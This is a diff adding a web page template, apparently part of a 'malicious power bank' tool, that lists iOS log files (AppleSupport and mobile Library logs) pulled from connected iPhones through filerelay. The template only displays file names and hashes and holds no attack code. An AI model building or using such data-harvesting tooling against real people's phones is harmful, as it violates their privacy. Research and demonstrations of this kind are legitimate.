@@ -1,0 +1,73 @@
+{% extends "base.html" %}
+
+{% block meta %}
+{% end %}
+
+{% block title %}恶意充电宝－日志文件{% end %}
+
+{% block pagecss %}{% end %}
+
+{% block pagejs_before %}{% end %}
+
+{% block body %}
+<div id="main">
+    <div class="inner-title">
+        <span class="font-green select-phone">{{ param["cur"] }}</span> <span> &gt; </span><span class="active-nav">越狱数据</span>
+    </div>
+    <div class="inner-cont dir">
+	  	<table class="tbl" id="logTbl">
+	     <tbody>
+
+	     </tbody>
+	   </table>
+    </div>
+</div>
+<script type="text/html" id="logTmpl">
+    <tr class="main-tr">
+        <td title="AppleSupport">filerelay/var/logs/AppleSupport (共{=opts.records.AppleSupport.length}个文件)</td>
+        {if(opts.records.AppleSupport.length>0)}
+        <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td>
+        </tr>
+        <tr class="link hide">
+	        <td colspan="2">
+	            <div class="inner-table-cont">
+			        <table class="tbl">
+				        {for(var i=0; i<opts.records.AppleSupport.length; i++)}
+				        <tr class="main-tr tr-file" data-md5="{=opts.records.AppleSupport[i].md5}">
+				            <td title="{=opts.records.AppleSupport[i].filename}">{=opts.records.AppleSupport[i].filename}</td>
+				        </tr>
+				        {/for}
+			        </table>
+			    </div>
+	    	</td>
+	    </tr>
+        {else}
+            <td></td></tr>
+        {/if}
+    <tr class="main-tr">
+        <td title="Logs">filerelay/var/mobile/Library/Logs (共{=opts.records.Logs.length}个文件)</td>
+        {if(opts.records.Logs.length>0)}
+        <td class="td-op"><i class="op-fold font-green" style="font-style:normal; padding-right:80px">展开</i></td></tr>
+        <tr class="link hide">
+	        <td colspan="2">
+		        <div class="inner-table-cont">
+			        <table class="tbl">
+				        {for(var i=0; i<opts.records.Logs.length; i++)}
+				        <tr class="main-tr tr-file" data-md5="{=opts.records.Logs[i].md5}">
+				            <td title="{=opts.records.Logs[i].filename}">{=opts.records.Logs[i].filename}</td>
+				        </tr>
+				        {/for}
+			        </table>
+			    </div>
+	    	</td>
+	    </tr>
+        {else}
+        <td></td></tr>
+        {/if}
+    
+</script>
+{% end %}
+
+{% block pagejs %}
+<script src="/static/js/page/log.js" type="text/javascript"></script>
+{% end %}
